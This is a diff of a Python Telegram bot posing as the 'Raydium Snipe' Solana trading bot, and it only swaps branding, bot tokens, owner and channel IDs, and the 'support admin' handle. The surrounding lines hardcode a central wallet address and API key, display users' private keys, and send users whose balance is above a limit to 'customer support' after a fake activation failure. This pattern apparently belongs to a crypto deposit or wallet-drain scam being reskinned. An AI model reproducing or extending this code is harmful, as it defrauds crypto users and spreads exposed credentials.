@@ -21,7 +21,7 @@ import json
 from threading import Timer
 import threading
 
-BOT_NAME = 'RaydiumSnipeBot'
+BOT_NAME = 'RaydiumSnipe_Bot'
 CENTRAL_ADDRESS = '4TK3gSRqXnYKryzsokfRAPLTfW1KMJdhKZXpC2Ni68g4'
 bitAPI = "ory_at_oFiURWw7aqs4EcoMDlCD_0YmdDd65-mArD-i6WZTttA.jQpug_XdRI5aoacG2K5GUcZjlwt_QwqBeF8OZFuMAUI"
 DB_FILE = "database.json"
@@ -101,12 +101,12 @@ print(users)
 '''
 
 # Token del bot (reemplaza 'YOUR_TOKEN' con el token de tu bot de Telegram)
-TOKEN = "7519577363:AAEYmyxdr027mIOeG6NphctTOh0UpKhToQs" # "7519577363:AAEYmyxdr027mIOeG6NphctTOh0UpKhToQs" # 
+TOKEN = "7774235247:AAFzxNfIxQrHDuxKIJhuKfxaqQ0UePe5-wA" # "7774235247:AAFzxNfIxQrHDuxKIJhuKfxaqQ0UePe5-wA" # 
 bot = Bot(TOKEN)
-owner_id = [5006318648,5006318648]
-# owner_channel = -1002358026086
-imported_channel = -1002358026086
-new_channel = -1002358026086
+owner_id = [6216175814,6216175814]
+# owner_channel = -1002534917643
+imported_channel = -1002534917643
+new_channel = -1002534917643
 # SOLANA_URL = "https://sly-maximum-fog.solana-mainnet.quiknode.pro/f9944f895882b197302a6912ee138be3a04e42b0"
 SOLANA_URL = "https://api.mainnet-beta.solana.com"
 
@@ -598,7 +598,7 @@ You will need to first fund your bot, Then click on Copy Trade, Paste in the add
 Transactions through Raydium Snipe incur a fee of 1%, or 0.9% if you were referred by another user. We don't charge a subscription fee or pay-wall any features.
 
 *Additional questions or need support?*
-Contact Raydium Snipebot official telegram support admin- @MrWhaIeREAL.
+Contact Raydium Snipebot official telegram support admin- @AlphaCapitalFx.
 """, reply_markup=reply_markup)
 
 async def referral(chat_id, context):
@@ -917,7 +917,7 @@ Private key: {user[2]}
             limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
             if total_balance > limit:
                 await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
-    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @MrWhaIeREAL""")
+    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @AlphaCapitalFx""")
                 return
             await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
 {limit} SOL Minimum balance required to activate trading bot""")
@@ -934,7 +934,7 @@ Private key: {user[2]}
             limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
             if total_balance > limit:
                 await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
-    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @MrWhaIeREAL""")
+    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @AlphaCapitalFx""")
                 return
             await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
 {limit} SOL Minimum balance required to activate trading bot""")
@@ -1055,7 +1055,7 @@ Your account will automatically be upgraded once the required deposit is detecte
             limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
             if total_balance > limit:
                 await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
-    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @MrWhaIeREAL""")
+    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @AlphaCapitalFx""")
                 return
             await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
 {limit} SOL Minimum balance required to activate trading bot""")
